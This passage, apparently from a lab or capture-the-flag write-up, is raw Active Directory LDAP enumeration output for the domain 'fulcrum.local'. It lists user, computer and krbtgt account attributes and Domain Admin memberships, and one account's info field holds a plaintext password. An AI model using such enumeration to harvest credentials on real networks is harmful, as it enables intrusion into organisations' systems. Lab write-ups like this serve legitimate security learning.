        &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">132964665675803546</span>&#125;<br>usncreated                     &#123;<span class="hljs-number">8196</span>&#125;<br>objectguid                     &#123;<span class="hljs-number">99</span> <span class="hljs-number">149</span> <span class="hljs-number">64</span> <span class="hljs-number">115</span> <span class="hljs-number">108</span> <span class="hljs-number">62</span> <span class="hljs-number">201</span> <span class="hljs-number">74</span> <span class="hljs-number">155</span> <span class="hljs-number">216</span> <span class="hljs-number">168</span> <span class="hljs-number">4</span> <span class="hljs-number">198</span> <span class="hljs-number">81</span> <span class="hljs-number">158</span> <span class="hljs-number">173</span>&#125;<br>memberof                       &#123;CN=<span class="hljs-built_in">Group</span> Policy Creator Owners,CN=Users,DC=fulcrum,DC=local, CN=Domain Admins,CN=Users,DC=fulcrum,DC=local, CN=Enterprise Admins,CN=Users,DC=fulcrum,DC=local, CN=Schema Admins,CN=Users,DC=fulcrum,DC=local...&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">52</span>:<span class="hljs-number">43</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">512</span>&#125;<br>cn                             &#123;Administrator&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>primarygroupid                 &#123;<span class="hljs-number">513</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">14</span>:<span class="hljs-number">22</span> AM&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM, <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM, <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span> AM, <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-number">16</span> PM&#125;<br>lastlogon                      &#123;<span class="hljs-number">132964733510360703</span>&#125;<br>distinguishedname              &#123;CN=Administrator,CN=Users,DC=fulcrum,DC=local&#125;<br>logonhours                     &#123;<span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span> <span class="hljs-number">255</span>&#125;<br>admincount                     &#123;<span class="hljs-number">1</span>&#125;<br>iscriticalsystemobject         &#123;True&#125;<br>samaccountname                 &#123;Administrator&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">244</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">0</span>&#125;<br>logoncount                     &#123;<span class="hljs-number">0</span>&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>description                    &#123;Built<span class="hljs-operator">-in</span> account <span class="hljs-keyword">for</span> guest access to the computer/domain&#125;<br>usnchanged                     &#123;<span class="hljs-number">8197</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>name                           &#123;Guest&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">0</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>usncreated                     &#123;<span class="hljs-number">8197</span>&#125;<br>objectguid                     &#123;<span class="hljs-number">98</span> <span class="hljs-number">147</span> <span class="hljs-number">227</span> <span class="hljs-number">7</span> <span class="hljs-number">107</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span> <span class="hljs-number">79</span> <span class="hljs-number">147</span> <span class="hljs-number">154</span> <span class="hljs-number">117</span> <span class="hljs-number">165</span> <span class="hljs-number">204</span> <span class="hljs-number">133</span> <span class="hljs-number">217</span> <span class="hljs-number">29</span>&#125;<br>memberof                       &#123;CN=Guests,CN=Builtin,DC=fulcrum,DC=local&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">52</span>:<span class="hljs-number">43</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=Guest,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">66082</span>&#125;<br>cn                             &#123;Guest&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>primarygroupid                 &#123;<span class="hljs-number">514</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">52</span>:<span class="hljs-number">43</span> AM&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span> AM, <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> AM&#125;<br>lastlogon                      &#123;<span class="hljs-number">0</span>&#125;<br>distinguishedname              &#123;CN=Guest,CN=Users,DC=fulcrum,DC=local&#125;<br>iscriticalsystemobject         &#123;True&#125;<br>samaccountname                 &#123;Guest&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">245</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br>ridsetreferences               &#123;CN=RID <span class="hljs-built_in">Set</span>,CN=DC,OU=Domain Controllers,DC=fulcrum,DC=local&#125;<br>logoncount                     &#123;<span class="hljs-number">16</span>&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Computer,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>msdfsr<span class="hljs-literal">-computerreferencebl</span>     &#123;CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR<span class="hljs-literal">-GlobalSettings</span>,CN=System,DC=fulcrum,DC=local&#125;<br>iscriticalsystemobject         &#123;True&#125;<br>operatingsystem                &#123;Windows Server <span class="hljs-number">2019</span> Standard&#125;<br>usnchanged                     &#123;<span class="hljs-number">24587</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>name                           &#123;DC&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">133066638014044691</span>&#125;<br>serviceprincipalname           &#123;Dfsr<span class="hljs-literal">-12F9A27C-BF97-4787-9364-D31B6C55EB04</span>/DC.fulcrum.local, ldap/DC.fulcrum.local/ForestDnsZones.fulcrum.local, ldap/DC.fulcrum.local/DomainDnsZones.fulcrum.local, DNS/DC.fulcrum.local...&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user...&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306369</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">133066638072992222</span>&#125;<br>usncreated                     &#123;<span class="hljs-number">12293</span>&#125;<br>objectguid                     &#123;<span class="hljs-number">143</span> <span class="hljs-number">151</span> <span class="hljs-number">162</span> <span class="hljs-number">140</span> <span class="hljs-number">203</span> <span class="hljs-number">166</span> <span class="hljs-number">2</span> <span class="hljs-number">71</span> <span class="hljs-number">128</span> <span class="hljs-number">139</span> <span class="hljs-number">40</span> <span class="hljs-number">15</span> <span class="hljs-number">248</span> <span class="hljs-number">36</span> <span class="hljs-number">220</span> <span class="hljs-number">157</span>&#125;<br>localpolicyflags               &#123;<span class="hljs-number">0</span>&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">20</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=DC,OU=Domain Controllers,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">532480</span>&#125;<br>cn                             &#123;DC&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>primarygroupid                 &#123;<span class="hljs-number">516</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">9</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">30</span>:<span class="hljs-number">07</span> AM&#125;<br>operatingsystemversion         &#123;<span class="hljs-number">10.0</span> (<span class="hljs-number">17763</span>)&#125;<br>dnshostname                    &#123;DC.fulcrum.local&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span> AM, <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> AM&#125;<br>lastlogon                      &#123;<span class="hljs-number">133066643997949777</span>&#125;<br>distinguishedname              &#123;CN=DC,OU=Domain Controllers,DC=fulcrum,DC=local&#125;<br>msds<span class="hljs-literal">-supportedencryptiontypes</span>  &#123;<span class="hljs-number">28</span>&#125;<br>samaccountname                 &#123;DC<span class="hljs-variable">$</span>&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">232</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>serverreferencebl              &#123;CN=DC,CN=Servers,CN=Default<span class="hljs-literal">-First-Site-Name</span>,CN=Sites,CN=Configuration,DC=fulcrum,DC=local&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br>logoncount                     &#123;<span class="hljs-number">0</span>&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>description                    &#123;Key Distribution Center Service Account&#125;<br>usnchanged                     &#123;<span class="hljs-number">12831</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>name                           &#123;krbtgt&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964665214072440</span>&#125;<br>showinadvancedviewonly         &#123;True&#125;<br>serviceprincipalname           &#123;kadmin/changepw&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>usncreated                     &#123;<span class="hljs-number">12324</span>&#125;<br>objectguid                     &#123;<span class="hljs-number">32</span> <span class="hljs-number">246</span> <span class="hljs-number">229</span> <span class="hljs-number">230</span> <span class="hljs-number">16</span> <span class="hljs-number">133</span> <span class="hljs-number">242</span> <span class="hljs-number">69</span> <span class="hljs-number">157</span> <span class="hljs-number">220</span> <span class="hljs-number">11</span> <span class="hljs-number">54</span> <span class="hljs-number">228</span> <span class="hljs-number">63</span> <span class="hljs-number">85</span> <span class="hljs-number">253</span>&#125;<br>memberof                       &#123;CN=Denied RODC Password Replication <span class="hljs-built_in">Group</span>,CN=Users,DC=fulcrum,DC=local&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">21</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=krbtgt,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">514</span>&#125;<br>cn                             &#123;krbtgt&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>primarygroupid                 &#123;<span class="hljs-number">513</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM, <span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span> AM, <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">04</span>:<span class="hljs-number">16</span> AM&#125;<br>lastlogon                      &#123;<span class="hljs-number">0</span>&#125;<br>distinguishedname              &#123;CN=krbtgt,CN=Users,DC=fulcrum,DC=local&#125;<br>msds<span class="hljs-literal">-supportedencryptiontypes</span>  &#123;<span class="hljs-number">0</span>&#125;<br>admincount                     &#123;<span class="hljs-number">1</span>&#125;<br>iscriticalsystemobject         &#123;True&#125;<br>samaccountname                 &#123;krbtgt&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">246</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br>samaccountname                 &#123;ldap&#125;<br>givenname                      &#123;ldap&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM&#125;<br>usnchanged                     &#123;<span class="hljs-number">24643</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>logoncount                     &#123;<span class="hljs-number">1</span>&#125;<br>name                           &#123;ldap&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964669477355095</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">133066745682798980</span>&#125;<br>streetaddress                  &#123;unknown&#125;<br>usncreated                     &#123;<span class="hljs-number">12595</span>&#125;<br>sn                             &#123;user&#125;<br>company                        &#123;fulcrum&#125;<br>objectguid                     &#123;<span class="hljs-number">150</span> <span class="hljs-number">136</span> <span class="hljs-number">6</span> <span class="hljs-number">204</span> <span class="hljs-number">202</span> <span class="hljs-number">150</span> <span class="hljs-number">221</span> <span class="hljs-number">75</span> <span class="hljs-number">166</span> <span class="hljs-number">233</span> <span class="hljs-number">206</span> <span class="hljs-number">164</span> <span class="hljs-number">157</span> <span class="hljs-number">88</span> <span class="hljs-number">198</span> <span class="hljs-number">236</span>&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">02</span>:<span class="hljs-number">27</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=ldap,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">66048</span>&#125;<br>cn                             &#123;ldap&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>l                              &#123;unknown&#125;<br>primarygroupid                 &#123;<span class="hljs-number">513</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">9</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">29</span>:<span class="hljs-number">28</span> AM&#125;<br>c                              &#123;UK&#125;<br>lastlogon                      &#123;<span class="hljs-number">133066745682798980</span>&#125;<br>distinguishedname              &#123;CN=ldap,CN=Users,DC=fulcrum,DC=local&#125;<br>st                             &#123;UN&#125;<br>postalcode                     &#123;<span class="hljs-number">12345</span>&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">79</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br>samaccountname                 &#123;<span class="hljs-number">923</span>a&#125;<br>givenname                      &#123;<span class="hljs-number">923</span>a&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM, <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM&#125;<br>usnchanged                     &#123;<span class="hljs-number">12813</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>logoncount                     &#123;<span class="hljs-number">0</span>&#125;<br>name                           &#123;<span class="hljs-number">923</span>a&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964669589856111</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>streetaddress                  &#123;unknown&#125;<br>usncreated                     &#123;<span class="hljs-number">12610</span>&#125;<br>sn                             &#123;<span class="hljs-number">923</span>a&#125;<br>company                        &#123;fulcrum&#125;<br>objectguid                     &#123;<span class="hljs-number">2</span> <span class="hljs-number">169</span> <span class="hljs-number">160</span> <span class="hljs-number">142</span> <span class="hljs-number">13</span> <span class="hljs-number">17</span> <span class="hljs-number">236</span> <span class="hljs-number">70</span> <span class="hljs-number">152</span> <span class="hljs-number">180</span> <span class="hljs-number">130</span> <span class="hljs-number">93</span> <span class="hljs-number">57</span> <span class="hljs-number">44</span> <span class="hljs-number">104</span> <span class="hljs-number">124</span>&#125;<br>memberof                       &#123;CN=Domain Admins,CN=Users,DC=fulcrum,DC=local&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">02</span>:<span class="hljs-number">38</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=<span class="hljs-number">923</span>a,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">66048</span>&#125;<br>cn                             &#123;<span class="hljs-number">923</span>a&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>l                              &#123;unknown&#125;<br>primarygroupid                 &#123;<span class="hljs-number">513</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM&#125;<br>c                              &#123;UK&#125;<br>lastlogon                      &#123;<span class="hljs-number">0</span>&#125;<br>distinguishedname              &#123;CN=<span class="hljs-number">923</span>a,CN=Users,DC=fulcrum,DC=local&#125;<br>st                             &#123;UN&#125;<br>admincount                     &#123;<span class="hljs-number">1</span>&#125;<br>postalcode                     &#123;<span class="hljs-number">12345</span>&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">80</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br>samaccountname                 &#123;BTables&#125;<br>givenname                      &#123;BTables&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 &#123;CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local&#125;<br>dscorepropagationdata          &#123;<span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM&#125;<br>usnchanged                     &#123;<span class="hljs-number">16404</span>&#125;<br>instancetype                   &#123;<span class="hljs-number">4</span>&#125;<br>logoncount                     &#123;<span class="hljs-number">1</span>&#125;<br>name                           &#123;BTables&#125;<br>badpasswordtime                &#123;<span class="hljs-number">0</span>&#125;<br>pwdlastset                     &#123;<span class="hljs-number">132964669694854344</span>&#125;<br>objectclass                    &#123;top, person, organizationalPerson, user&#125;<br>badpwdcount                    &#123;<span class="hljs-number">0</span>&#125;<br>samaccounttype                 &#123;<span class="hljs-number">805306368</span>&#125;<br>lastlogontimestamp             &#123;<span class="hljs-number">132965813265089947</span>&#125;<br>streetaddress                  &#123;unknown&#125;<br>usncreated                     &#123;<span class="hljs-number">12628</span>&#125;<br>sn                             &#123;BTables&#125;<br>company                        &#123;fulcrum&#125;<br>objectguid                     &#123;<span class="hljs-number">211</span> <span class="hljs-number">177</span> <span class="hljs-number">93</span> <span class="hljs-number">142</span> <span class="hljs-number">140</span> <span class="hljs-number">210</span> <span class="hljs-number">161</span> <span class="hljs-number">74</span> <span class="hljs-number">180</span> <span class="hljs-number">157</span> <span class="hljs-number">245</span> <span class="hljs-number">248</span> <span class="hljs-number">33</span> <span class="hljs-number">105</span> <span class="hljs-number">89</span> <span class="hljs-number">254</span>&#125;<br>info                           &#123;Password <span class="hljs-built_in">set</span> to ++FileServerLogon12345++&#125;<br>whencreated                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">02</span>:<span class="hljs-number">49</span> AM&#125;<br>adspath                        &#123;LDAP://dc.fulcrum.local/CN=BTables,CN=Users,DC=fulcrum,DC=local&#125;<br>useraccountcontrol             &#123;<span class="hljs-number">66048</span>&#125;<br>cn                             &#123;BTables&#125;<br>countrycode                    &#123;<span class="hljs-number">0</span>&#125;<br>l                              &#123;unknown&#125;<br>primarygroupid                 &#123;<span class="hljs-number">513</span>&#125;<br>whenchanged                    &#123;<span class="hljs-number">5</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">48</span>:<span class="hljs-number">46</span> PM&#125;<br>c                              &#123;UK&#125;<br>lastlogon                      &#123;<span class="hljs-number">132965813265089947</span>&#125;<br>distinguishedname              &#123;CN=BTables,CN=Users,DC=fulcrum,DC=local&#125;<br>st                             &#123;UN&#125;<br>postalcode                     &#123;<span class="hljs-number">12345</span>&#125;<br>objectsid                      &#123;<span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">216</span> <span class="hljs-number">239</span> <span class="hljs-number">5</span> <span class="hljs-number">69</span> <span class="hljs-number">222</span> <span class="hljs-number">106</span> <span class="hljs-number">231</span> <span class="hljs-number">38</span> <span class="hljs-number">26</span> <span class="hljs-number">113</span> <span class="hljs-number">214</span> <span class="hljs-number">180</span> <span class="hljs-number">81</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>&#125;<br>lastlogoff                     &#123;<span class="hljs-number">0</span>&#125;<br>accountexpires                 &#123;<span class="hljs-number">9223372036854775807</span>&#125;<br>logoncount                     &#123;<span class="hljs-number">11</span>&#125;<br>codepage                       &#123;<span class="hljs-number">0</span>&#125;<br>objectcategory                 